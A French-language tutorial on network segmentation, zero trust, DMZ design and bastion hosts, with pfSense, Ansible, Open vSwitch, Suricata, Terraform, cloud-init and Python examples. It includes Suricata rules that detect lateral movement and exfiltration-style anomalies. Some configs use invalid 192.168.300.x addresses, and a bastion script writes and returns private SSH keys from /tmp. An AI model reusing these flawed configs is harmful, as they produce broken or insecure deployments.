# Interface VLAN configuration
<vlans>
    <vlan>
        <if>em1</if>
        <tag>10</tag>
        <descr>USERS_VLAN</descr>
        <vlanif>em1.10</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>20</tag>
        <descr>SERVERS_VLAN</descr>
        <vlanif>em1.20</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>30</tag>
        <descr>ADMIN_VLAN</descr>
        <vlanif>em1.30</vlanif>
    </vlan>
    <vlan>
        <if>em1</if>
        <tag>100</tag>
        <descr>DMZ_VLAN</descr>
        <vlanif>em1.100</vlanif>
    </vlan>
</vlans>

# Firewall rules pour segmentation
<filter>
    <rule>
        <type>block</type>
        <interface>USERS_VLAN</interface>
        <source>
            <network>USERS_VLAN</network>
        </source>
        <destination>
            <network>ADMIN_VLAN</network>
        </destination>
        <descr>Block Users to Admin</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>USERS_VLAN</interface>
        <source>
            <network>USERS_VLAN</network>
        </source>
        <destination>
            <network>SERVERS_VLAN</network>
        </destination>
        <protocol>tcp</protocol>
        <destination>
            <port>80,443</port>
        </destination>
        <descr>Allow Users to Web Services</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>ADMIN_VLAN</interface>
        <source>
            <network>ADMIN_VLAN</network>
        </source>
        <destination>
            <any/>
        </destination>
        <descr>Allow Admin Full Access</descr>
    </rule>
</filter>
```

**Automatisation avec Ansible :**

```yaml
# playbooks/pfsense-segmentation.yml
---
- name: Configure pfSense Network Segmentation
  hosts: pfsense_firewalls
  gather_facts: no
  vars:
    pfsense_user: admin
    pfsense_password: "{{ vault_pfsense_password }}"
    
  tasks:
    - name: Configure VLANs
      pfsense_vlan:
        name: "{{ item.name }}"
        interface: "{{ item.interface }}"
        vlan_id: "{{ item.vlan_id }}"
        description: "{{ item.description }}"
        state: present
      loop:
        - { name: "USERS_VLAN", interface: "em1", vlan_id: 10, description: "User Workstations" }
        - { name: "SERVERS_VLAN", interface: "em1", vlan_id: 20, description: "Application Servers" }
        - { name: "ADMIN_VLAN", interface: "em1", vlan_id: 30, description: "Administrative Access" }
        - { name: "DMZ_VLAN", interface: "em1", vlan_id: 100, description: "Demilitarized Zone" }
        
    - name: Configure interface assignments
      pfsense_interface:
        descr: "{{ item.descr }}"
        if: "{{ item.if }}"
        ipaddr: "{{ item.ipaddr }}"
        subnet: "{{ item.subnet }}"
        state: present
      loop:
        - { descr: "USERS", if: "em1.10", ipaddr: "192.168.10.1", subnet: "24" }
        - { descr: "SERVERS", if: "em1.20", ipaddr: "192.168.20.1", subnet: "24" }
        - { descr: "ADMIN", if: "em1.30", ipaddr: "192.168.30.1", subnet: "24" }
        - { descr: "DMZ", if: "em1.100", ipaddr: "192.168.100.1", subnet: "24" }
        
    - name: Configure firewall rules - Block inter-VLAN by default
      pfsense_rule:
        name: "{{ item.name }}"
        action: "{{ item.action }}"
        interface: "{{ item.interface }}"
        source: "{{ item.source }}"
        destination: "{{ item.destination }}"
        protocol: "{{ item.protocol | default('any') }}"
        port: "{{ item.port | default('any') }}"
        state: present
      loop:
        # Default deny rules
        - name: "Block Users to Admin"
          action: "block"
          interface: "USERS"
          source: "USERS:network"
          destination: "ADMIN:network"
          
        - name: "Block Users to Servers Management"
          action: "block"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "tcp"
          port: "22,3389,5985,5986"
          
        # Allow specific services
        - name: "Allow Users to Web Services"
          action: "pass"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "tcp"
          port: "80,443"
          
        - name: "Allow Users to DNS"
          action: "pass"
          interface: "USERS"
          source: "USERS:network"
          destination: "SERVERS:network"
          protocol: "udp"
          port: "53"
          
        # Admin access
        - name: "Allow Admin Full Access"
          action: "pass"
          interface: "ADMIN"
          source: "ADMIN:network"
          destination: "any"
```

### Micro-segmentation avec Open vSwitch

**Configuration SDN avancÃ©e :**

```bash
# Configuration Open vSwitch pour micro-segmentation
ovs-vsctl add-br br-security

# CrÃ©ation des ports VLAN
ovs-vsctl add-port br-security vlan10 tag=10 -- set interface vlan10 type=internal
ovs-vsctl add-port br-security vlan20 tag=20 -- set interface vlan20 type=internal
ovs-vsctl add-port br-security vlan30 tag=30 -- set interface vlan30 type=internal

# Configuration IP des interfaces VLAN
ip addr add 192.168.10.1/24 dev vlan10
ip addr add 192.168.20.1/24 dev vlan20
ip addr add 192.168.30.1/24 dev vlan30

ip link set vlan10 up
ip link set vlan20 up
ip link set vlan30 up

# RÃ¨gles OpenFlow pour micro-segmentation
# Bloquer trafic inter-VLAN par dÃ©faut
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=10,actions=output:CONTROLLER"
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=20,actions=output:CONTROLLER"
ovs-ofctl add-flow br-security "table=0,priority=100,dl_vlan=30,actions=output:CONTROLLER"

# Autoriser trafic intra-VLAN
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=10,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=20,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"
ovs-ofctl add-flow br-security "table=0,priority=200,dl_vlan=30,dl_dst=ff:ff:ff:ff:ff:ff,actions=flood"

# RÃ¨gles spÃ©cifiques pour services autorisÃ©s
# Users (VLAN 10) vers Servers (VLAN 20) - HTTP/HTTPS uniquement
ovs-ofctl add-flow br-security "table=0,priority=300,dl_vlan=10,nw_proto=6,tp_dst=80,actions=mod_vlan_vid:20,output:NORMAL"
ovs-ofctl add-flow br-security "table=0,priority=300,dl_vlan=10,nw_proto=6,tp_dst=443,actions=mod_vlan_vid:20,output:NORMAL"

# Admin (VLAN 30) accÃ¨s complet
ovs-ofctl add-flow br-security "table=0,priority=400,dl_vlan=30,actions=output:NORMAL"
```

### Zero Trust Network Architecture

**ImplÃ©mentation Zero Trust :**

```python
#!/usr/bin/env python3
# zero-trust-controller.py

import json
import requests
import time
from datetime import datetime, timedelta

class ZeroTrustController:
    def __init__(self, config_file="zero-trust-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        self.active_sessions = {}
        self.trust_scores = {}
        
    def authenticate_device(self, device_id, user_id, device_info):
        """Authentification continue des devices"""
        trust_score = self.calculate_trust_score(device_id, user_id, device_info)
        
        if trust_score >= self.config['min_trust_score']:
            session_id = self.create_session(device_id, user_id, trust_score)
            self.apply_network_policies(session_id, trust_score)
            return session_id
        else:
            self.deny_access(device_id, user_id, trust_score)
            return None
            
    def calculate_trust_score(self, device_id, user_id, device_info):
        """Calcul du score de confiance basÃ© sur multiples facteurs"""
        score = 50  # Score de base
        
        # Facteur gÃ©olocalisation
        if device_info.get('location') in self.config['trusted_locations']:
            score += 20
        elif device_info.get('location') in self.config['suspicious_locations']:
            score -= 30
            
        # Facteur temporel
        current_hour = datetime.now().hour
        if 8 <= current_hour <= 18:  # Heures de bureau
            score += 10
        elif 22 <= current_hour or current_hour <= 6:  # Nuit
            score -= 15
            
        # Historique du device
        device_history = self.get_device_history(device_id)
        if device_history['incidents'] == 0:
            score += 15
        else:
            score -= device_history['incidents'] * 5
            
        # Comportement utilisateur
        user_behavior = self.analyze_user_behavior(user_id)
        score += user_behavior['anomaly_score']
        
        return max(0, min(100, score))
        
    def apply_network_policies(self, session_id, trust_score):
        """Application des politiques rÃ©seau basÃ©es sur le trust score"""
        session = self.active_sessions[session_id]
        device_ip = session['device_ip']
        
        if trust_score >= 80:
            # AccÃ¨s complet
            self.configure_firewall_rules(device_ip, "full_access")
            self.set_bandwidth_limit(device_ip, None)
            
        elif trust_score >= 60:
            # AccÃ¨s limitÃ©
            self.configure_firewall_rules(device_ip, "limited_access")
            self.set_bandwidth_limit(device_ip, "10Mbps")
            
        elif trust_score >= 40:
            # AccÃ¨s restreint
            self.configure_firewall_rules(device_ip, "restricted_access")
            self.set_bandwidth_limit(device_ip, "5Mbps")
            self.enable_enhanced_monitoring(device_ip)
            
        else:
            # AccÃ¨s minimal (quarantaine)
            self.configure_firewall_rules(device_ip, "quarantine")
            self.set_bandwidth_limit(device_ip, "1Mbps")
            self.enable_enhanced_monitoring(device_ip)
            
    def configure_firewall_rules(self, device_ip, policy_type):
        """Configuration dynamique des rÃ¨gles firewall"""
        policies = {
            "full_access": {
                "allowed_ports": "any",
                "allowed_destinations": "any",
                "monitoring_level": "standard"
            },
            "limited_access": {
                "allowed_ports": [80, 443, 53, 22],
                "allowed_destinations": ["internal_servers", "internet"],
                "monitoring_level": "enhanced"
            },
            "restricted_access": {
                "allowed_ports": [80, 443, 53],
                "allowed_destinations": ["internal_servers"],
                "monitoring_level": "intensive"
            },
            "quarantine": {
                "allowed_ports": [80, 443],
                "allowed_destinations": ["security_portal"],
                "monitoring_level": "maximum"
            }
        }
        
        policy = policies[policy_type]
        
        # Configuration pfSense via API
        pfsense_config = {
            "source": device_ip,
            "destination": policy["allowed_destinations"],
            "ports": policy["allowed_ports"],
            "action": "pass",
            "description": f"Zero Trust - {policy_type}"
        }
        
        self.update_pfsense_rules(pfsense_config)
        
    def continuous_monitoring(self):
        """Surveillance continue et rÃ©Ã©valuation des trust scores"""
        while True:
            for session_id, session in self.active_sessions.items():
                # RÃ©Ã©valuation pÃ©riodique
                new_trust_score = self.reevaluate_trust_score(session_id)
                
                if abs(new_trust_score - session['trust_score']) > 10:
                    # Changement significatif du trust score
                    session['trust_score'] = new_trust_score
                    self.apply_network_policies(session_id, new_trust_score)
                    
                # VÃ©rification des anomalies rÃ©seau
                if self.detect_network_anomalies(session['device_ip']):
                    self.handle_security_incident(session_id)
                    
            time.sleep(60)  # RÃ©Ã©valuation toutes les minutes
            
    def detect_network_anomalies(self, device_ip):
        """DÃ©tection d'anomalies rÃ©seau en temps rÃ©el"""
        # Analyse du trafic rÃ©seau
        traffic_stats = self.get_traffic_stats(device_ip)
        
        anomalies = []
        
        # DÃ©tection de scan de ports
        if traffic_stats['unique_destinations'] > 100:
            anomalies.append("port_scanning")
            
        # DÃ©tection de transfert de donnÃ©es anormal
        if traffic_stats['bytes_out'] > 1000000000:  # 1GB
            anomalies.append("data_exfiltration")
            
        # DÃ©tection de connexions suspectes
        for destination in traffic_stats['destinations']:
            if destination in self.config['malicious_ips']:
                anomalies.append("malicious_communication")
                
        return len(anomalies) > 0
        
    def handle_security_incident(self, session_id):
        """Gestion des incidents de sÃ©curitÃ©"""
        session = self.active_sessions[session_id]
        
        # Isolation immÃ©diate
        self.configure_firewall_rules(session['device_ip'], "quarantine")
        
        # Notification SIEM
        incident_data = {
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "device_ip": session['device_ip'],
            "user_id": session['user_id'],
            "incident_type": "network_anomaly",
            "severity": "high"
        }
        
        self.send_to_siem(incident_data)
        
        # Notification administrateur
        self.send_alert(f"Security incident detected for device {session['device_ip']}")

if __name__ == "__main__":
    controller = ZeroTrustController()
    controller.continuous_monitoring()
```

### Monitoring et dÃ©tection d'intrusion

**Configuration Suricata pour segmentation :**

```yaml
# suricata.yaml
vars:
  address-groups:
    HOME_NET: "[192.168.10.0/24,192.168.20.0/24,192.168.30.0/24]"
    EXTERNAL_NET: "!$HOME_NET"
    DMZ_NET: "192.168.100.0/24"
    SERVERS_NET: "192.168.20.0/24"
    USERS_NET: "192.168.10.0/24"
    ADMIN_NET: "192.168.30.0/24"

rule-files:
  - segmentation-rules.rules
  - lateral-movement.rules
  - data-exfiltration.rules

# RÃ¨gles personnalisÃ©es pour segmentation
# /etc/suricata/rules/segmentation-rules.rules
alert tcp $USERS_NET any -> $ADMIN_NET any (msg:"Unauthorized access to admin network"; sid:1000001; rev:1;)
alert tcp $USERS_NET any -> $SERVERS_NET ![80,443,53] (msg:"Unauthorized service access from users"; sid:1000002; rev:1;)
alert tcp any any -> $DMZ_NET 22 (msg:"SSH access to DMZ from internal network"; sid:1000003; rev:1;)
alert tcp $EXTERNAL_NET any -> $SERVERS_NET any (msg:"Direct external access to servers"; sid:1000004; rev:1;)

# DÃ©tection de mouvement latÃ©ral
alert smb any any -> $SERVERS_NET 445 (msg:"SMB lateral movement attempt"; sid:1000010; rev:1;)
alert tcp any any -> any 3389 (msg:"RDP lateral movement"; sid:1000011; rev:1;)
alert tcp any any -> any [5985,5986] (msg:"WinRM lateral movement"; sid:1000012; rev:1;)
```

### Cas d'usage spÃ©cialisÃ©s

**Environnement healthcare :** ImplÃ©mentez une segmentation stricte pour sÃ©parer les systÃ¨mes mÃ©dicaux critiques (VLAN isolÃ©), les postes administratifs, et les Ã©quipements IoT mÃ©dicaux avec des politiques de sÃ©curitÃ© spÃ©cifiques Ã  HIPAA.

**Infrastructure industrielle :** CrÃ©ez une segmentation OT/IT avec des zones dÃ©diÃ©es pour les systÃ¨mes SCADA, les automates programmables, et les rÃ©seaux de capteurs, avec des passerelles sÃ©curisÃ©es pour les communications inter-zones.

**Environnement multi-tenant :** DÃ©ployez une micro-segmentation par client avec isolation complÃ¨te des donnÃ©es et des flux rÃ©seau, permettant une facturation et une surveillance individualisÃ©es.

---

## 7.3 DMZ et bastions

### Architecture DMZ moderne

Une **DMZ (Demilitarized Zone)** crÃ©e une zone tampon entre le rÃ©seau interne et Internet, hÃ©bergeant les services publics tout en protÃ©geant l'infrastructure interne. Cette architecture de sÃ©curitÃ© multicouche utilise des bastions comme points d'accÃ¨s contrÃ´lÃ©s et surveillÃ©s.

Imaginez une DMZ comme le **hall d'accueil d'un bÃ¢timent sÃ©curisÃ©** : les visiteurs peuvent accÃ©der aux services publics (rÃ©ception, salle de confÃ©rence) sans jamais pÃ©nÃ©trer dans les bureaux privÃ©s. Les bastions sont les **agents de sÃ©curitÃ©** qui contrÃ´lent et enregistrent tous les accÃ¨s vers les zones sensibles.

### Topologie DMZ multicouche

```
Architecture DMZ Enterprise :

                    Internet
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚ Edge    â”‚ Firewall pÃ©rimÃ¨tre
                   â”‚Firewall â”‚ (WAF + DDoS protection)
                   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚External â”‚ DMZ externe
                   â”‚  DMZ    â”‚ VLAN 100
              â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”
              â”‚                   â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚Web Srv  â”‚         â”‚Mail     â”‚
         â”‚Reverse  â”‚         â”‚Gateway  â”‚
         â”‚Proxy    â”‚         â”‚(Relay)  â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Internal â”‚ Firewall interne
                   â”‚Firewall â”‚ (Application aware)
                   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Internal â”‚ DMZ interne
                   â”‚  DMZ    â”‚ VLAN 200
              â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”
              â”‚                   â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚App Srv  â”‚         â”‚Database â”‚
         â”‚(Internalâ”‚         â”‚Proxy    â”‚
         â”‚Services)â”‚         â”‚         â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Bastion  â”‚ Jump servers
                   â”‚ Hosts   â”‚ VLAN 300
              â”Œâ”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”
              â”‚                   â”‚
         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”         â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
         â”‚SSH      â”‚         â”‚RDP      â”‚
         â”‚Bastion  â”‚         â”‚Bastion  â”‚
         â”‚(Linux)  â”‚         â”‚(Windows)â”‚
         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜         â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Core     â”‚ Firewall cÅ“ur
                   â”‚Firewall â”‚ (Zero Trust)
                   â””â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”˜
                        â”‚
                   â”Œâ”€â”€â”€â”€â–¼â”€â”€â”€â”€â”
                   â”‚Internal â”‚ RÃ©seau interne
                   â”‚Network  â”‚ VLAN 10-50
                   â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜

Flux de sÃ©curitÃ© :
Internet â†’ Edge FW â†’ Ext DMZ â†’ Int FW â†’ Int DMZ â†’ Bastion â†’ Core FW â†’ Internal
```

### Configuration pfSense DMZ

**Configuration multicouche avec pfSense :**

```bash
# Configuration pfSense pour DMZ
# /conf/config.xml

<interfaces>
    <wan>
        <enable/>
        <if>em0</if>
        <ipaddr>dhcp</ipaddr>
        <descr>WAN</descr>
    </wan>
    
    <lan>
        <enable/>
        <if>em1</if>
        <ipaddr>192.168.1.1</ipaddr>
        <subnet>24</subnet>
        <descr>LAN</descr>
    </lan>
    
    <opt1>
        <enable/>
        <if>em2</if>
        <ipaddr>192.168.100.1</ipaddr>
        <subnet>24</subnet>
        <descr>DMZ_EXTERNAL</descr>
    </opt1>
    
    <opt2>
        <enable/>
        <if>em3</if>
        <ipaddr>192.168.200.1</ipaddr>
        <subnet>24</subnet>
        <descr>DMZ_INTERNAL</descr>
    </opt2>
    
    <opt3>
        <enable/>
        <if>em4</if>
        <ipaddr>192.168.300.1</ipaddr>
        <subnet>24</subnet>
        <descr>BASTION</descr>
    </opt3>
</interfaces>

# RÃ¨gles firewall DMZ
<filter>
    <!-- Internet vers DMZ externe -->
    <rule>
        <type>pass</type>
        <interface>wan</interface>
        <source><any/></source>
        <destination>
            <address>192.168.100.10</address>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>80,443</port></destination>
        <descr>Allow HTTP/HTTPS to Web Server</descr>
    </rule>
    
    <rule>
        <type>pass</type>
        <interface>wan</interface>
        <source><any/></source>
        <destination>
            <address>192.168.100.20</address>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>25,587</port></destination>
        <descr>Allow SMTP to Mail Gateway</descr>
    </rule>
    
    <!-- DMZ externe vers DMZ interne -->
    <rule>
        <type>pass</type>
        <interface>dmz_external</interface>
        <source>
            <address>192.168.100.10</address>
        </source>
        <destination>
            <network>DMZ_INTERNAL</network>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>8080,3306</port></destination>
        <descr>Web to App/DB</descr>
    </rule>
    
    <!-- Bastion vers LAN -->
    <rule>
        <type>pass</type>
        <interface>bastion</interface>
        <source>
            <network>BASTION</network>
        </source>
        <destination>
            <network>LAN</network>
        </destination>
        <protocol>tcp</protocol>
        <destination><port>22,3389</port></destination>
        <descr>Bastion to Internal</descr>
    </rule>
    
    <!-- Bloquer tout le reste -->
    <rule>
        <type>block</type>
        <interface>dmz_external</interface>
        <source><any/></source>
        <destination><any/></destination>
        <descr>Block all other DMZ external</descr>
    </rule>
</filter>
```

### Bastions sÃ©curisÃ©s avec Terraform

**DÃ©ploiement automatisÃ© de bastions :**

```hcl
# bastion-infrastructure.tf
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "allowed_cidr_blocks" {
  description = "CIDR blocks allowed to access bastion"
  type        = list(string)
  default     = ["203.0.113.0/24"]  # IP publiques autorisÃ©es
}

# SSH Bastion (Linux)
resource "proxmox_vm_qemu" "ssh_bastion" {
  name        = "bastion-ssh-${var.environment}"
  target_node = "proxmox1"
  
  clone      = "ubuntu-22.04-hardened-template"
  full_clone = true
  
  # Configuration sÃ©curisÃ©e
  cores  = 2
  memory = 4096
  
  disk {
    size    = "20G"
    storage = "local-ssd"  # SSD pour logs
    discard = "on"
  }
  
  # Interface DMZ
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300  # VLAN Bastion
  }
  
  # Configuration rÃ©seau
  ipconfig0 = "ip=192.168.300.10/24,gw=192.168.300.1"
  nameserver = "8.8.8.8"
  sshkeys   = file("~/.ssh/bastion_rsa.pub")
  
  # Cloud-init pour durcissement
  cicustom = "user=local:snippets/bastion-cloudinit.yml"
  
  tags = "${var.environment},bastion,ssh,security"
}

# RDP Bastion (Windows)
resource "proxmox_vm_qemu" "rdp_bastion" {
  name        = "bastion-rdp-${var.environment}"
  target_node = "proxmox2"
  
  clone      = "windows-server-2022-hardened-template"
  full_clone = true
  
  cores  = 4
  memory = 8192
  
  disk {
    size    = "60G"
    storage = "ceph-storage"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300
  }
  
  ipconfig0 = "ip=192.168.300.20/24,gw=192.168.300.1"
  
  tags = "${var.environment},bastion,rdp,windows"
}

# Load Balancer pour bastions (HA)
resource "proxmox_vm_qemu" "bastion_lb" {
  name        = "bastion-lb-${var.environment}"
  target_node = "proxmox3"
  
  clone      = "ubuntu-22.04-template"
  full_clone = true
  
  cores  = 2
  memory = 2048
  
  disk {
    size    = "20G"
    storage = "local-lvm"
  }
  
  network {
    model  = "virtio"
    bridge = "vmbr0"
    tag    = 300
  }
  
  ipconfig0 = "ip=192.168.300.5/24,gw=192.168.300.1"
  sshkeys   = file("~/.ssh/id_rsa.pub")
  
  tags = "${var.environment},bastion,loadbalancer,haproxy"
}

# Outputs
output "bastion_access" {
  value = {
    ssh_bastion = {
      ip = proxmox_vm_qemu.ssh_bastion.default_ipv4_address
      command = "ssh -i ~/.ssh/bastion_rsa admin@${proxmox_vm_qemu.ssh_bastion.default_ipv4_address}"
    }
    rdp_bastion = {
      ip = proxmox_vm_qemu.rdp_bastion.default_ipv4_address
      command = "rdesktop ${proxmox_vm_qemu.rdp_bastion.default_ipv4_address}"
    }
    lb_endpoint = proxmox_vm_qemu.bastion_lb.default_ipv4_address
  }
}
```

### Configuration sÃ©curisÃ©e des bastions

**Durcissement SSH Bastion :**

```yaml
# cloud-init/bastion-cloudinit.yml
#cloud-config
users:
  - name: admin
    groups: sudo
    shell: /bin/bash
    ssh_authorized_keys:
      - ssh-rsa AAAAB3NzaC1yc2E... bastion-key
    sudo: ['ALL=(ALL) NOPASSWD:ALL']

packages:
  - fail2ban
  - auditd
  - rsyslog
  - chrony
  - ufw

write_files:
  - path: /etc/ssh/sshd_config
    content: |
      # SSH Hardening Configuration
      Port 22
      Protocol 2
      
      # Authentication
      PermitRootLogin no
      PasswordAuthentication no
      PubkeyAuthentication yes
      AuthorizedKeysFile .ssh/authorized_keys
      
      # Security
      AllowUsers admin
      MaxAuthTries 3
      MaxSessions 2
      LoginGraceTime 30
      
      # Logging
      LogLevel VERBOSE
      SyslogFacility AUTH
      
      # Network
      ClientAliveInterval 300
      ClientAliveCountMax 2
      TCPKeepAlive no
      
      # Disable dangerous features
      AllowAgentForwarding no
      AllowTcpForwarding yes
      X11Forwarding no
      PermitTunnel no
      
  - path: /etc/fail2ban/jail.local
    content: |
      [DEFAULT]
      bantime = 3600
      findtime = 600
      maxretry = 3
      
      [sshd]
      enabled = true
      port = ssh
      filter = sshd
      logpath = /var/log/auth.log
      maxretry = 3
      bantime = 86400
      
  - path: /etc/audit/rules.d/bastion.rules
    content: |
      # Audit rules for bastion host
      -w /etc/passwd -p wa -k identity
      -w /etc/group -p wa -k identity
      -w /etc/shadow -p wa -k identity
      -w /etc/sudoers -p wa -k privilege_escalation
      -w /var/log/auth.log -p wa -k authentication
      -a always,exit -F arch=b64 -S execve -k command_execution
      -a always,exit -F arch=b32 -S execve -k command_execution
      
  - path: /opt/bastion-monitor.sh
    permissions: '0755'
    content: |
      #!/bin/bash
      # Bastion monitoring script
      
      LOG_FILE="/var/log/bastion-activity.log"
      
      # Log all SSH connections
      who | while read line; do
          echo "$(date): Active session: $line" >> $LOG_FILE
      done
      
      # Check for suspicious activity
      FAILED_LOGINS=$(grep "Failed password" /var/log/auth.log | wc -l)
      if [ $FAILED_LOGINS -gt 10 ]; then
          echo "$(date): WARNING: $FAILED_LOGINS failed login attempts" >> $LOG_FILE
          # Send alert to SIEM
          logger -p auth.warning "Bastion: High number of failed logins: $FAILED_LOGINS"
      fi
      
      # Monitor disk space
      DISK_USAGE=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')
      if [ $DISK_USAGE -gt 80 ]; then
          echo "$(date): WARNING: Disk usage at $DISK_USAGE%" >> $LOG_FILE
      fi

runcmd:
  - systemctl enable fail2ban
  - systemctl start fail2ban
  - systemctl enable auditd
  - systemctl start auditd
  - systemctl restart sshd
  - ufw --force enable
  - ufw allow 22/tcp
  - ufw default deny incoming
  - ufw default allow outgoing
  - echo "*/5 * * * * /opt/bastion-monitor.sh" | crontab -
  - echo "Bastion configuration completed" >> /var/log/cloud-init.log
```

### Proxy et tunneling sÃ©curisÃ©

**Configuration HAProxy pour bastion :**

```bash
# /etc/haproxy/haproxy.cfg
global
    daemon
    user haproxy
    group haproxy
    log 127.0.0.1:514 local0
    chroot /var/lib/haproxy
    stats socket /run/haproxy/admin.sock mode 660 level admin
    
defaults
    mode tcp
    log global
    option tcplog
    option dontlognull
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms
    
# SSH Load Balancing
frontend ssh_frontend
    bind *:22
    mode tcp
    default_backend ssh_bastions
    
backend ssh_bastions
    mode tcp
    balance roundrobin
    option tcp-check
    tcp-check connect
    server bastion1 192.168.300.10:22 check
    server bastion2 192.168.300.11:22 check backup
    
# RDP Load Balancing  
frontend rdp_frontend
    bind *:3389
    mode tcp
    default_backend rdp_bastions
    
backend rdp_bastions
    mode tcp
    balance roundrobin
    option tcp-check
    tcp-check connect port 3389
    server rdp-bastion1 192.168.300.20:3389 check
    server rdp-bastion2 192.168.300.21:3389 check backup
    
# Statistics
frontend stats
    bind *:8404
    mode http
    stats enable
    stats uri /stats
    stats refresh 30s
    stats admin if TRUE
```

### Monitoring et audit des bastions

**Configuration ELK pour bastions :**

```yaml
# filebeat-bastion.yml
filebeat.inputs:
- type: log
  enabled: true
  paths:
    - /var/log/auth.log
    - /var/log/audit/audit.log
    - /var/log/bastion-activity.log
  fields:
    log_type: bastion
    environment: production
    
- type: log
  enabled: true
  paths:
    - /var/log/haproxy.log
  fields:
    log_type: haproxy
    service: bastion_lb
    
output.logstash:
  hosts: ["192.168.50.10:5044"]
  
processors:
- add_host_metadata:
    when.not.contains.tags: forwarded
```

**Dashboard Grafana pour bastions :**

```json
{
  "dashboard": {
    "title": "Bastion Hosts Monitoring",
    "panels": [
      {
        "title": "Active SSH Sessions",
        "type": "stat",
        "targets": [
          {
            "expr": "count(up{job=\"bastion-ssh\"})",
            "legendFormat": "Active Bastions"
          }
        ]
      },
      {
        "title": "Failed Login Attempts",
        "type": "graph",
        "targets": [
          {
            "expr": "rate(bastion_failed_logins_total[5m])",
            "legendFormat": "Failed Logins/min"
          }
        ]
      },
      {
        "title": "Command Execution",
        "type": "table",
        "targets": [
          {
            "expr": "bastion_commands_executed",
            "legendFormat": "Commands"
          }
        ]
      }
    ]
  }
}
```

### Automatisation et orchestration

**Script de gestion des accÃ¨s :**

```python
#!/usr/bin/env python3
# bastion-access-manager.py

import json
import subprocess
import time
from datetime import datetime, timedelta
import requests

class BastionAccessManager:
    def __init__(self, config_file="bastion-config.json"):
        with open(config_file, 'r') as f:
            self.config = json.load(f)
        self.active_sessions = {}
        
    def request_access(self, user_id, target_host, justification, duration_hours=8):
        """Demande d'accÃ¨s temporaire via bastion"""
        request_id = f"req_{int(time.time())}"
        
        access_request = {
            "request_id": request_id,
            "user_id": user_id,
            "target_host": target_host,
            "justification": justification,
            "duration_hours": duration_hours,
            "requested_at": datetime.now().isoformat(),
            "status": "pending"
        }
        
        # Validation automatique pour certains utilisateurs
        if user_id in self.config['auto_approve_users']:
            return self.approve_access(request_id, access_request)
        else:
            return self.send_for_approval(request_id, access_request)
            
    def approve_access(self, request_id, access_request):
        """Approbation et configuration de l'accÃ¨s"""
        user_id = access_request['user_id']
        target_host = access_request['target_host']
        duration = access_request['duration_hours']
        
        # GÃ©nÃ©ration clÃ© SSH temporaire
        key_path = f"/tmp/temp_key_{request_id}"
        subprocess.run([
            "ssh-keygen", "-t", "rsa", "-b", "4096",
            "-f", key_path, "-N", "", "-C", f"temp_access_{user_id}"
        ])
        
        # DÃ©ploiement clÃ© sur bastion
        self.deploy_temp_key(user_id, f"{key_path}.pub", duration)
        
        # Configuration firewall temporaire
        self.configure_temp_firewall_rule(user_id, target_host, duration)
        
        # Programmation rÃ©vocation
        revoke_time = datetime.now() + timedelta(hours=duration)
        self.schedule_revocation(request_id, revoke_time)
        
        # Notification utilisateur
        access_info = {
            "request_id": request_id,
            "ssh_command": f"ssh -i {key_path} {user_id}@{self.config['bastion_host']}",
            "target_command": f"ssh {target_host}",
            "expires_at": revoke_time.isoformat(),
            "private_key": open(key_path, 'r').read()
        }
        
        return access_info
        
